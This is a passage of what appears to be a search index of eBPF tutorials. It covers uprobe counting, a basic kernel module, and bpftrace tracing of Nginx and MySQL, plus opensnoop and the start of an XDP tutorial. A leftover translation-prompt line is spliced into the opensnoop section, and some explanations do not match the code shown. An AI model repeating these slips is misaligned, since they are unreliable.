58;\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/minimal/#uprobe-trace","title":"uprobe trace","text":"<p>This code is a BPF (Berkeley Packet Filter) program written in C, often used for tracing and monitoring activities in the Linux kernel. BPF allows you to run custom programs within the kernel without modifying its source code. The code you provided creates a BPF program that uses a BPF map to count the number of times the <code>uprobe</code> function is called within a specified cgroup.</p> <pre><code>#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include \"bits.bpf.h\"\n#include \"maps.bpf.h\"\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 1024);\n    __type(key, u64);\n    __type(value, u64);\n} libc_uprobe_calls_total SEC(\".maps\");\n\nSEC(\"uprobe/libc.so.6:uprobe\")\nint do_count(struct pt_regs *ctx)\n{\n    u64 cgroup_id = bpf_get_current_cgroup_id();\n\n    increment_map(&amp;libc_uprobe_calls_total, &amp;cgroup_id, 1);\n\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>from https://github.com/cloudflare/ebpf_exporter/blob/master/examples/uprobe.bpf.c</p> <p>Here's a breakdown of the code:</p> <ol> <li>Headers Inclusion:</li> <li><code>&lt;vmlinux.h&gt;</code>: Provides access to kernel data structures and definitions.</li> <li><code>&lt;bpf/bpf_helpers.h&gt;</code>: Includes helper functions and macros for BPF programs.</li> <li><code>\"bits.bpf.h\"</code>: Custom header file (assumed to contain additional definitions).</li> <li> <p><code>\"maps.bpf.h\"</code>: Custom header file (assumed to contain definitions related to BPF maps).</p> </li> <li> <p>Definition of BPF Map:    The code defines a BPF map named <code>libc_uprobe_calls_total</code> using the <code>struct</code> syntax. This map is of type <code>BPF_MAP_TYPE_HASH</code> (hash map) with a maximum of 1024 entries. The keys and values are of type <code>u64</code> (unsigned 64-bit integer).</p> </li> <li> <p>Map Definition Attributes:    The attributes specified within the map definition (<code>__uint</code>, <code>__type</code>) set properties of the map, such as its type, maximum number of entries, and types of keys and values.</p> </li> <li> <p>BPF Program:</p> </li> <li>The program is associated with a <code>uprobe</code> on the <code>uprobe</code> function in the <code>libc.so.6</code> library.</li> <li>The <code>do_count</code> function is executed when the <code>uprobe</code> function is called.</li> <li>It retrieves the current cgroup ID using <code>bpf_get_current_cgroup_id()</code>.</li> <li> <p>Then, it increments the <code>libc_uprobe_calls_total</code> map with the cgroup ID as the key and increments the associated value by 1.</p> </li> <li> <p>License Information:    The <code>LICENSE[]</code> array contains the license information for the BPF program. In this case, the program is licensed under the GPL (GNU General Public License).</p> </li> </ol> <p>The purpose of this BPF program is to track and count the number of <code>uprobe</code> calls that occur within specific cgroups in the Linux kernel. It uses a BPF hash map to store and update the counts. This can be useful for monitoring memory allocation patterns and resource usage within different cgroups.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/minimal/#how-to-run-uprobe","title":"how to run uprobe","text":"<p>server</p> <pre><code>example/minimal# LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so ./uprobe\n</code></pre> <p>client</p> <pre><code>example/minimal#  LD_PRELOAD=~/.bpftime/libbpftime-agent.so ./victim\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/minimal/#syscall","title":"Syscall","text":""},{"location":"tutorials/38-btf-uprobe/test-verify/minimal/#how-to-run-syscall","title":"how to run syscall","text":"<p>server</p> <pre><code>LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so ./syscall\n</code></pre> <p>client</p> <pre><code>sudo ~/.bpftime/bpftime start -s ./victim\n# or AGENT_SO=build/runtime/agent/libbpftime-agent.so LD_PRELOAD=build/attach/text_segment_transformer/libbpftime-agent-transformer.so ./victim\n</code></pre> <p>Share on  Share on </p>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/","title":"write a basic kernel module","text":""},{"location":"tutorials/38-btf-uprobe/test-verify/module/#hello-world","title":"hello world","text":"<p>Writing a Linux kernel module involves creating code that can be loaded into and unloaded from the kernel dynamically, without rebooting the system. Here\u2019s a simple step-by-step guide to help you write a basic kernel module:</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#1-set-up-your-environment","title":"1. Set Up Your Environment","text":"<p>Make sure you have the Linux kernel headers installed and a suitable development environment ready. For Ubuntu or Debian, install them with:</p> <pre><code>sudo apt-get install linux-headers-$(uname -r) build-essential\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#2-write-the-kernel-module-code","title":"2. Write the Kernel Module Code","text":"<p>Here\u2019s an example of a very basic Linux kernel module:</p> <pre><code>// hello.c: A simple Linux kernel module\n#include &lt;linux/init.h&gt;    // Macros for module initialization\n#include &lt;linux/module.h&gt;  // Core header for loading modules\n#include &lt;linux/kernel.h&gt;  // Kernel logging macros\n\n// Function executed when the module is loaded\nstatic int __init hello_init(void)\n{\n    printk(KERN_INFO \"Hello, world!\\n\");\n    return 0;  // Return 0 if successful\n}\n\n// Function executed when the module is removed\nstatic void __exit hello_exit(void)\n{\n    printk(KERN_INFO \"Goodbye, world!\\n\");\n}\n\n// Macros to define the module\u2019s init and exit points\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n\nMODULE_LICENSE(\"GPL\");               // License type (GPL)\nMODULE_AUTHOR(\"Your Name\");          // Module author\nMODULE_DESCRIPTION(\"A simple module\"); // Module description\nMODULE_VERSION(\"1.0\");               // Module version\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#3-create-a-makefile","title":"3. Create a Makefile","text":"<p>To compile the kernel module, you\u2019ll need a <code>Makefile</code>. Here's a simple one:</p> <pre><code>obj-m += hello.o  # hello.o is the target\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#4-compile-the-module","title":"4. Compile the Module","text":"<p>Run the following command in the directory where your <code>hello.c</code> and <code>Makefile</code> are located:</p> <pre><code>make\n</code></pre> <p>This will generate a file called <code>hello.ko</code>, which is the compiled kernel module.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#5-load-the-module","title":"5. Load the Module","text":"<p>To insert the module into the kernel, use <code>insmod</code>:</p> <pre><code>sudo insmod hello.ko\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#6-check-the-logs","title":"6. Check the Logs","text":"<p>To see the output from the <code>printk</code> statements, use the <code>dmesg</code> command:</p> <pre><code>dmesg | tail\n</code></pre> <p>You should see something like:</p> <pre><code>[ 1234.5678] Hello, world!\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#7-remove-the-module","title":"7. Remove the Module","text":"<p>To unload the module, use <code>rmmod</code>:</p> <pre><code>sudo rmmod hello\n</code></pre> <p>Again, check the logs using <code>dmesg</code>:</p> <pre><code>sudo dmesg | tail\n</code></pre> <p>You should see:</p> <pre><code>[ 1234.9876] Goodbye, world!\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#8-clean-up","title":"8. Clean Up","text":"<p>To clean up the build files, run:</p> <pre><code>make clean\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#notes","title":"Notes","text":"<ul> <li>License: The <code>MODULE_LICENSE(\"GPL\")</code> ensures the module is GPL-compliant, which allows it to use symbols (functions) exported by the kernel.</li> <li>Debugging: Use <code>printk</code> for logging within the module. It behaves similarly to <code>printf</code> but is designed for kernel space.</li> <li>Module Parameters: You can add parameters to modules using <code>module_param()</code> to pass arguments when the module is loaded.</li> </ul>"},{"location":"tutorials/38-btf-uprobe/test-verify/module/#next-steps","title":"Next Steps","text":"<p>Once you are familiar with this basic example, you can explore:</p> <ul> <li>Writing more advanced modules that interact with hardware or the filesystem.</li> <li>Using kernel-specific APIs like work queues, kthreads, or handling interrupts.</li> <li>Diving into eBPF or loadable kernel module techniques for debugging and tracing kernel events.</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/39-nginx/","title":"Using eBPF to Trace Nginx Requests","text":"<p>Nginx is one of the most popular web servers and reverse proxies in the world, known for its high performance, stability, and low resource consumption. It is widely used for serving static content, load balancing, and acting as a reverse proxy for dynamic applications. To maintain its performance edge, it's crucial to monitor and optimize Nginx's operations, especially when handling a large number of requests. One powerful way to gain insights into Nginx's performance is by using eBPF (Extended Berkeley Packet Filter).</p> <p>eBPF is a revolutionary technology that allows developers to run custom programs in the Linux kernel. Originally designed for network packet filtering, eBPF has evolved into a versatile tool for tracing, monitoring, and profiling system behavior in both kernel and user space. By leveraging eBPF, you can trace Nginx's critical functions, measure latency, and identify bottlenecks without modifying the source code or restarting the service.</p>"},{"location":"tutorials/39-nginx/#background-nginx-and-ebpf","title":"Background: Nginx and eBPF","text":""},{"location":"tutorials/39-nginx/#nginx","title":"Nginx","text":"<p>Nginx operates on an event-driven architecture, making it highly efficient and capable of handling thousands of simultaneous connections with minimal resources. This efficiency is achieved through various performance-critical functions involved in request processing, response generation, and event handling. Understanding how these functions behave under different loads is key to optimizing Nginx for your specific use case.</p>"},{"location":"tutorials/39-nginx/#ebpf","title":"eBPF","text":"<p>eBPF programs run in a secure, sandboxed environment within the Linux kernel. These programs can attach to various hooks, such as system calls, tracepoints, and even user-space functions via uprobes (user-level probes). This capability allows you to collect detailed performance data and enforce policies in real time, making eBPF an invaluable tool for system observability.</p> <p>One common use case of eBPF is tracing function execution to measure latency, which is particularly useful for understanding how long specific Nginx functions take to execute. This information can help in diagnosing performance issues, optimizing resource usage, and improving the overall efficiency of your Nginx deployment.</p>"},{"location":"tutorials/39-nginx/#uprobes","title":"Uprobes","text":"<p>Uprobes are a type of probe that can be used to trace functions in user-space applications, such as Nginx. They work by attaching to specific user-space function entry and exit points, allowing you to capture precise timing information. However, it\u2019s important to note that using uprobes in the kernel mode eBPF runtime may cause some performance overhead. To mitigate this, you can consider using a user-mode eBPF runtime like bpftime, which is based on LLVM JIT/AOT. This runtime can run eBPF programs in user space, offering compatibility with kernel mode eBPF while potentially reducing overhead.</p>"},{"location":"tutorials/39-nginx/#performance-critical-functions-in-nginx","title":"Performance-Critical Functions in Nginx","text":"<p>Here are some key Nginx functions that are performance-critical and can be monitored using eBPF:</p> <ul> <li>ngx_http_process_request: Processes incoming HTTP requests. Monitoring this function helps track the start of request handling.</li> <li>ngx_http_upstream_send_request: Handles sending requests to upstream servers when Nginx is acting as a reverse proxy.</li> <li>ngx_http_finalize_request: Finalizes HTTP request processing, including sending the response. Tracing this can measure total request handling time.</li> <li>ngx_event_process_posted: Processes queued events as part of the Nginx event loop.</li> <li>ngx_handle_read_event: Handles read events from sockets, crucial for monitoring network I/O performance.</li> <li>ngx_writev_chain: Sends responses back to the client, typically used in conjunction with the write event loop.</li> </ul>"},{"location":"tutorials/39-nginx/#using-bpftrace-to-trace-nginx-functions","title":"Using bpftrace to Trace Nginx Functions","text":"<p>To monitor these functions, we can use <code>bpftrace</code>, a high-level tracing language for eBPF. Below is a script that traces the execution time of several critical Nginx functions:</p> <pre><code>#!/usr/sbin/bpftrace\n\n// Monitor the start of HTTP request processing\nuprobe:/usr/sbin/nginx:ngx_http_process_request\n{\n    printf(\"HTTP request processing started (tid: %d)\\n\", tid);\n    @start[tid] = nsecs;\n}\n\n// Monitor when an HTTP request is finalized\nuretprobe:/usr/sbin/nginx:ngx_http_finalize_request\n/@start[tid]/\n{\n    $elapsed = nsecs - @start[tid];\n    printf(\"HTTP request processed in %d ns (tid: %d)\\n\", $elapsed, tid);\n    delete(@start[tid]);\n}\n\n// Monitor the start of sending a request to an upstream server\nuprobe:/usr/sbin/nginx:ngx_http_upstream_send_request\n{\n    printf(\"Upstream request sending started (tid: %d)\\n\", tid);\n    @upstream_start[tid] = nsecs;\n}\n\n// Monitor when the upstream request is sent\nuretprobe:/usr/sbin/nginx:ngx_http_upstream_send_request\n/@upstream_start[tid]/\n{\n    $elapsed = nsecs - @upstream_start[tid];\n    printf(\"Upstream request sent in %d ns (tid: %d)\\n\", $elapsed, tid);\n    delete(@upstream_start[tid]);\n}\n\n// Monitor the start of event processing\nuprobe:/usr/sbin/nginx:ngx_event_process_posted\n{\n    printf(\"Event processing started (tid: %d)\\n\", tid);\n    @event_start[tid] = nsecs;\n}\n\n// Monitor when event processing is completed\nuretprobe:/usr/sbin/nginx:ngx_event_process_posted\n/@event_start[tid]/\n{\n    $elapsed = nsecs - @event_start[tid];\n    printf(\"Event processed in %d ns (tid: %d)\\n\", $elapsed, tid);\n    delete(@event_start[tid]);\n}\n</code></pre>"},{"location":"tutorials/39-nginx/#running-the-program","title":"Running the Program","text":"<p>To run the above script, start Nginx and use a tool like <code>curl</code> to generate HTTP requests:</p> <pre><code># bpftrace /home/yunwei37/bpf-developer-tutorial/src/39-nginx/trace.bt\nAttaching 4 probes...\nEvent processing started (tid: 1071)\nEvent processed in 166396 ns (tid: 1071)\nEvent processing started (tid: 1071)\nEvent processed in 87998 ns (tid: 1071)\nHTTP request processing started (tid: 1071)\nHTTP request processed in 1083969 ns (tid: 1071)\nEvent processing started (tid: 1071)\nEvent processed in 92597 ns (tid: 1071)\n</code></pre> <p>The script monitors the start and end times of various Nginx functions and prints the elapsed time for each. This data can be used to analyze and optimize the performance of your Nginx server.</p>"},{"location":"tutorials/39-nginx/#testing-function-latency-in-nginx","title":"Testing Function Latency in Nginx","text":"<p>For a more detailed analysis of function latency, you can use the <code>funclatency</code> tool, which measures the latency distribution of Nginx functions. Here\u2019s how to test the latency of the <code>ngx_http_process_request</code> function:</p> <pre><code># sudo ./funclatency /usr/sbin/nginx:ngx_http_process_request\ntracing /usr/sbin/nginx:ngx_http_process_request...\ntracing func ngx_http_process_request in /usr/sbin/nginx...\nTracing /usr/sbin/nginx:ngx_http_process_request.  Hit Ctrl-C to exit\n^C\n     nsec                : count    distribution\n         0 -&gt; 1          : 0        |                                        |\n   524288 -&gt; 1048575    : 16546    |****************************************|\n   1048576 -&gt; 2097151    : 2296     |*****                                   |\n   2097152 -&gt; 4194303    : 1264     |***                                     |\n   4194304 -&gt; 8388607    : 293      |                                        |\n   8388608 -&gt; 16777215   : 37       |                                        |\nExiting trace of /usr/sbin/nginx:ngx_http_process_request\n</code></pre>"},{"location":"tutorials/39-nginx/#summary-of-results","title":"Summary of Results","text":"<p>The results above show the distribution of latency for the <code>ngx_http_process_request</code> function. The majority of requests were processed within 524,288 to 1,048,575 nanoseconds, with a smaller percentage taking longer. This information can be crucial in identifying performance bottlenecks and optimizing request handling in Nginx.</p> <p>By using <code>funclatency</code>, you can:</p> <ul> <li>Identify Performance Bottlenecks: Understand which functions are taking the most time to execute and focus your optimization efforts there.</li> <li>Monitor System Performance: Regularly monitor function latency to ensure your Nginx server is performing optimally, especially under heavy load.</li> <li>Optimize Nginx Configuration: Use the insights gained from latency measurements to tweak Nginx settings or modify your application to improve overall performance.</li> </ul> <p>You can find the <code>funclatency</code> tool in the bpf-developer-tutorial repository.</p>"},{"location":"tutorials/39-nginx/#conclusion","title":"Conclusion","text":"<p>Tracing Nginx requests with eBPF provides valuable insights into the performance of your web server, allowing you to monitor, analyze, and optimize its operation. By using tools like <code>bpftrace</code> and <code>funclatency</code>, you can measure function execution times, identify bottlenecks, and make data-driven decisions to improve your Nginx deployment.</p> <p>For those interested in learning more about eBPF, including more advanced examples and tutorials, please visit our https://github.com/eunomia-bpf/bpf-developer-tutorial or check out our https://eunomia.dev/tutorials/.</p> <p>Share on  Share on </p>"},{"location":"tutorials/4-opensnoop/","title":"eBPF Tutorial by Example 4: Capturing Opening Files and Filter with Global Variables","text":"<p>eBPF (Extended Berkeley Packet Filter) is a kernel execution environment that allows users to run secure and efficient programs in the kernel. It is commonly used for network filtering, performance analysis, security monitoring, and other scenarios. The power of eBPF lies in its ability to capture and modify network packets or system calls at runtime in the kernel, enabling monitoring and adjustment of the operating system's behavior.</p> <p>This article is the fourth part of the eBPF Tutorial by Example, mainly focusing on how to capture the system call collection of process opening files and filtering process PIDs using global variables in eBPF.</p> <p>In Linux system, the interaction between processes and files is achieved through system calls. System calls serve as the interface between user space programs and kernel space programs, allowing user programs to request specific operations from the kernel. In this tutorial, we focus on the sys_openat system call, which is used to open files.</p> <p>When a process opens a file, it issues a sys_openat system call to the kernel and passes relevant parameters (such as file path, open mode, etc.). The kernel handles this request and returns a file descriptor, which serves as a reference for subsequent file operations. By capturing the sys_openat system call, we can understand when and how a process opens a file.</p>"},{"location":"tutorials/4-opensnoop/#capturing-the-system-call-collection-of-process-opening-files-in-ebpf","title":"Capturing the System Call Collection of Process Opening Files in eBPF","text":"<p>First, we need to write an eBPF program to capture the system call of a process opening a file. The specific implementation is as follows:</p> <pre><code>#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n\n/// @description \"Process ID to trace\"\nconst volatile int pid_target = 0;\n\nSEC(\"tracepoint/syscalls/sys_enter_openat\")\nint tracepoint__syscalls__sys_enter_openat(struct trace_event_raw_sys_enter* ctx)\n{\n    u64 id = bpf_get_current_pid_tgid();\n    u32 pid = id &gt;&gt; 32;\n\n    if (pid_target &amp;&amp; pid_target != pid)\n        return false;\n\n    // Use bpf_printk to print the process information\n    bpf_printk(\"Process ID: %d enter sys openat\\n\", pid);\n    return 0;\n}\n\n/// \"Trace open family syscalls.\"\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This eBPF program implements the following:</p> <ol> <li>Include header files:  contains the definition of kernel data structures, and  contains the helper functions required by eBPF programs. <li>Define the global variable <code>pid_target</code> for filtering a specified process ID. Setting it to 0 captures sys_openat calls from all processes.</li> <li>Use the <code>SEC</code> macro to define an eBPF program associated with the tracepoint \"tracepoint/syscalls/sys_enter_openat\". This tracepoint is triggered when a process initiates the <code>sys_openat</code> system call.</li> <li>Implement the eBPF program <code>tracepoint__syscalls__sys_enter_openat</code>, which takes a parameter <code>ctx</code> of type <code>struct trace_event_raw_sys_enter</code>. This structure contains information about the system call.</li> <li>Use the <code>bpf_get_current_pid_tgid()</code> function to retrieve the PID and TID (Thread  ID) of the current process. Since we only care about the PID, we shift its value 32 bits to the right and assign it to the variable <code>pid</code> of Type <code>u32</code>.</li> <li>Check if the <code>pid_target</code> variable is equal to the current process's PID. If <code>pid_target</code> is not 0 and is not equal to the current process's PID, return <code>false</code> to skip capturing the <code>sys_openat</code> call of that process.</li> <li>Use the <code>bpf_printk()</code> function to print the captured process ID and relevant information about the <code>sys_openat</code> call. These information can be viewed in user space using BPF tools.</li> <li>Set the program license to \"GPL\", which is a necessary condition for running eBPF programs.### Instructions Translate the following Chinese text to English while maintaining the original formatting:</li> <p>\"This eBPF program can be loaded into the kernel and executed using tools like libbpf or eunomia-bpf. It captures the sys_openat system call of the specified process (or all processes) and outputs relevant information in user-space.</p> <p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain combined with Wasm. Its purpose is to simplify the development, building, distribution, and execution of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the ecc compilation toolchain and ecli runtime. We will use eunomia-bpf to compile and run this example. The complete code of this example can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/4-opensnoop .</p> <p>Compile and run the above code:</p> <pre><code>$ ecc opensnoop.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n$ sudo ecli run package.json\nRunning eBPF program...\n</code></pre> <p>After running this program, you can view the output of the eBPF program by viewing the <code>/sys/kernel/debug/tracing/trace_pipe</code> file:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n           &lt;...&gt;-3840345 [010] d... 3220701.101179: bpf_trace_printk: Process ID: 3840345 enter sys openat\n           &lt;...&gt;-3840345 [010] d... 3220702.158000: bpf_trace_printk: Process ID: 3840345 enter sys openat\n</code></pre> <p>At this point, we are able to capture the sys_openat system call for opening files by processes.</p>"},{"location":"tutorials/4-opensnoop/#filtering-process-pid-in-ebpf-using-global-variables","title":"Filtering Process PID in eBPF using Global Variables","text":"<p>Global variables act as a data sharing mechanism in eBPF programs, allowing data interaction between user space programs and eBPF programs. This is very useful when filtering specific conditions or modifying the behavior of eBPF programs. This design allows user space programs to dynamically control the behavior of eBPF programs at runtime.</p> <p>In our example, the global variable <code>pid_target</code> is used to filter process PIDs. User space programs can set the value of this variable to capture only the <code>sys_openat</code> system calls related to the specified PID in the eBPF program.</p> <p>The principle of using global variables is that they are defined and stored in the data section of eBPF programs. When the eBPF program is loaded into the kernel and executed, these global variables are retained in the kernel and can be accessed through BPF system calls. User space programs can use certain features of BPF system calls, such as <code>bpf_obj_get_info_by_fd</code> and <code>bpf_obj_get_info</code>, to obtain information about the eBPF object, including the position and value of global variables.</p> <p>You can view the help information for opensnoop by executing the command <code>ecli -h</code>:</p> <pre><code>$ ecli package.json -h\nUsage: opensnoop_bpf [--help] [--version] [--verbose] [--pid_target VAR]\n\nTrace open family syscalls.\n\nOptional arguments:\n  -h, --help    shows help message and exits \n  -v, --version prints version information and exits \n  --verbose     prints libbpf debug information \n  --pid_target  Process ID to trace \n\nBuilt with eunomia-bpf framework.\nSee https://github.com/eunomia-bpf/eunomia-bpf for more information.\n</code></pre> <p>You can specify the PID of the process to capture by using the <code>--pid_target</code> option, for example:</p> <pre><code>$ sudo ./ecli run package.json  --pid_target 618\nRunning eBPF program...\n</code></pre> <p>After running this program, you can view the output of the eBPF program by viewing the <code>/sys/kernel/debug/tracing/trace_pipe</code> file:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\".\\-3840345 [010] d... 3220701.101179: bpf_trace_printk: Process ID: 618 enter sys openat\n\\-3840345 [010] d... 3220702.158000: bpf_trace_printk: Process ID: 618 enter sys openat\n</code></pre>"},{"location":"tutorials/4-opensnoop/#summary","title":"Summary","text":"<p>This article introduces how to use eBPF programs to capture the system calls for process file opening. In an eBPF program, we can capture the system calls for process file opening by defining functions <code>tracepoint__syscalls__sys_enter_open</code> and <code>tracepoint__syscalls__sys_enter_openat</code> and attaching them to the tracepoints <code>sys_enter_open</code> and <code>sys_enter_openat</code> using the <code>SEC</code> macro. We can use the <code>bpf_get_current_pid_tgid</code> function to get the process ID that calls the open or openat system call, and print it out in the kernel log using the <code>bpf_printk</code> function. In an eBPF program, we can also filter the output by defining a global variable <code>pid_target</code> to specify the pid of the process to be captured, only outputting the information of the specified process.</p> <p>By learning this tutorial, you should have a deeper understanding of how to capture and filter system calls for specific processes in eBPF. This method has widespread applications in system monitoring, performance analysis, and security auditing.</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and a complete tutorial.</p> <p>Share on  Share on </p>"},{"location":"tutorials/40-mysql/","title":"Using eBPF to Trace MySQL Queries","text":"<p>MySQL is one of the most widely used relational database management systems in the world. Whether you are running a small application or a large-scale enterprise system, understanding the performance characteristics of your MySQL database can be crucial. In particular, knowing how long SQL queries take to execute and which queries are consuming the most time can help in diagnosing performance issues and optimizing your database for better efficiency.</p> <p>This is where eBPF (Extended Berkeley Packet Filter) comes into play. eBPF is a powerful technology that allows you to write programs that can run in the Linux kernel, enabling you to trace, monitor, and analyze various aspects of system behavior, including the performance of applications like MySQL. In this blog, we'll explore how to use eBPF to trace MySQL queries, measure their execution time, and gain valuable insights into your database's performance.</p>"},{"location":"tutorials/40-mysql/#background-mysql-and-ebpf","title":"Background: MySQL and eBPF","text":""},{"location":"tutorials/40-mysql/#mysql","title":"MySQL","text":"<p>MySQL is a relational database management system (RDBMS) that uses Structured Query Language (SQL) to manage and query data. It is widely used for a variety of applications, from web applications to data warehousing. MySQL's performance can be critical to the overall performance of your application, especially when dealing with large datasets or complex queries.</p>"},{"location":"tutorials/40-mysql/#ebpf","title":"eBPF","text":"<p>eBPF is a technology that allows for the execution of custom programs in the Linux kernel without the need to modify the kernel source code or load kernel modules. Initially designed for network packet filtering, eBPF has evolved into a versatile tool for performance monitoring, security, and debugging. eBPF programs can be attached to various kernel and user-space events, making it possible to trace the execution of functions, system calls, and more.</p> <p>Using eBPF, we can trace the execution of MySQL functions, such as <code>dispatch_command</code>, which is responsible for handling SQL queries. By tracing this function, we can capture the start and end times of query execution, measure the latency, and log the executed queries.</p>"},{"location":"tutorials/40-mysql/#tracing-mysql-queries-with-ebpf","title":"Tracing MySQL Queries with eBPF","text":"<p>To trace MySQL queries using eBPF, we can write a script using <code>bpftrace</code>, a high-level tracing language for eBPF. Below is a script that traces the <code>dispatch_command</code> function in MySQL to log executed queries and measure their execution time:</p> <pre><code>#!/usr/bin/env bpftrace\n\n// Trace the dispatch_command function in MySQL\nuprobe:/usr/sbin/mysqld:dispatch_command\n{\n    // Store the start time of the command execution in the map\n    @start_times[tid] = nsecs;\n\n    // Print the process ID and command string\n    printf(\"MySQL command executed by PID %d: \", pid);\n\n    // The third argument to dispatch_command is the SQL query string\n    printf(\"%s\\n\", str(arg3));\n}\n\nuretprobe:/usr/sbin/mysqld:dispatch_command\n{\n    // Retrieve the start time from the map\n    $start = @start_times[tid];\n\n    // Calculate the latency in milliseconds\n    $delta = (nsecs - $start) / 1000000;\n\n    // Print the latency\n    printf(\"Latency: %u ms\\n\", $delta);\n\n    // Delete the entry from the map to avoid memory leaks\n    delete(@start_times[tid]);\n}\n</code></pre>"},{"location":"tutorials/40-mysql/#explanation-of-the-script","title":"Explanation of the Script","text":"<ol> <li>Tracing the <code>dispatch_command</code> Function:</li> <li>The script attaches an <code>uprobe</code> to the <code>dispatch_command</code> function in MySQL. This function is called whenever MySQL needs to execute a SQL query. <code>Uprobe</code> in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime.</li> <li> <p>The <code>uprobe</code> captures the start time of the function execution and logs the SQL query being executed.</p> </li> <li> <p>Calculating and Logging Latency:</p> </li> <li>A corresponding <code>uretprobe</code> is attached to the <code>dispatch_command</code> function. The <code>uretprobe</code> triggers when the function returns, allowing us to calculate the total execution time (latency) of the query.</li> <li> <p>The latency is calculated in milliseconds and printed to the console.</p> </li> <li> <p>Managing State with Maps:</p> </li> <li>The script uses a BPF map to store the start times of each query, keyed by the thread ID (<code>tid</code>). This allows us to match the start and end of each query execution.</li> <li>After calculating the latency, the entry is removed from the map to avoid memory leaks.</li> </ol>"},{"location":"tutorials/40-mysql/#running-the-script","title":"Running the Script","text":"<p>To run this script, simply save it to a file (e.g., <code>trace_mysql.bt</code>), and then execute it using <code>bpftrace</code>:</p> <pre><code>sudo bpftrace trace_mysql.bt\n</code></pre>"},{"location":"tutorials/40-mysql/#sample-output","title":"Sample Output","text":"<p>Once the script is running, it will print information about each SQL query executed by MySQL, including the process ID, the query itself, and the latency:</p> <pre><code>MySQL command executed by PID 1234: SELECT * FROM users WHERE id = 1;\nLatency: 15 ms\nMySQL command executed by PID 1234: UPDATE users SET name = 'Alice' WHERE id = 2;\nLatency: 23 ms\nMySQL command executed by PID 1234: INSERT INTO orders (user_id, product_id) VALUES (1, 10);\nLatency: 42 ms\n</code></pre> <p>This output shows the SQL commands being executed and how long each one took, providing valuable insights into the performance of your MySQL queries.</p>"},{"location":"tutorials/40-mysql/#what-can-we-learn-from-tracing-mysql","title":"What Can We Learn from Tracing MySQL?","text":"<p>By tracing MySQL queries with eBPF, you can gain several insights:</p> <ul> <li>Identify Slow Queries: You can quickly identify which SQL queries are taking the longest to execute. This is critical for performance tuning and optimizing your database schema or indexing strategies.</li> <li>Monitor Database Performance: Regularly monitor the latency of queries to ensure that your MySQL database is performing optimally under different workloads.</li> <li>Debugging and Troubleshooting: When facing performance issues, this tracing method can help you pinpoint the exact queries causing delays, making it easier to troubleshoot and resolve issues.</li> <li>Capacity Planning: By understanding the latency of various queries, you can better plan for capacity, ensuring that your MySQL database can handle increased load or more complex queries.</li> </ul>"},{"location":"tutorials/40-mysql/#conclusion","title":"Conclusion","text":"<p>eBPF provides a powerful way to monitor and trace the performance of MySQL queries without making intrusive changes to your system. By using tools like <code>bpftrace</code>, you can gain real-time insights into how your database is performing, identify potential bottlenecks, and optimize your system for better performance.</p> <p>If you're interested in learning more about eBPF and how it can be used to monitor and optimize other parts of your system, be sure to check out our https://github.com/eunomia-bpf/bpf-developer-tutorial or visit our https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/41-xdp-tcpdump/","title":"eBPF Tutorial by Example: Capturing TCP Information with XDP","text":"<p>Extended Berkeley Packet Filter (eBPF) is a revolutionary technology in the Linux kernel that allows developers to run sandboxed programs within the kernel space. It enables powerful networking, security, and tracing capabilities without the need to modify the kernel source code or load kernel modules. This tutorial focuses on using eBPF with the Express Data Path (XDP) to capture TCP header information directly from network packets at the earliest point of ingress.</p>"},{"location":"tutorials/41-xdp-tcpdump/#capturing-tcp-headers-with-xdp","title":"Capturing TCP Headers with XDP","text":"<p>Capturing network packets is essential for monitoring, debugging, and securing network communications. Traditional tools like <code>tcpdump</code> operate in user space and can incur significant overhead. By leveraging eBPF and XDP, we can capture TCP header information directly within the kernel, minimizing overhead and improving performance.</p> <p>In this tutorial, we'll develop an XDP program that intercepts incoming TCP packets and extracts their header information. We'll store this data in a ring buffer, which a user-space program will read and display in a human-readable format.</p>"},{"location":"tutorials/41-xdp-tcpdump/#why-use-xdp-for-packet-capturing","title":"Why Use XDP for Packet Capturing?","text":"<p>XDP is a high-performance data path within the Linux kernel that allows for programmable packet processing at the lowest level of the network stack. By attaching an eBPF program to XDP, we can process packets immediately as they arrive, reducing latency and improving efficiency.</p>"},{"location":"tutorials/41-xdp-tcpdump/#kernel-ebpf-code-analysis","title":"Kernel eBPF Code Analysis","text":"<p>Let's dive into the kernel-space eBPF 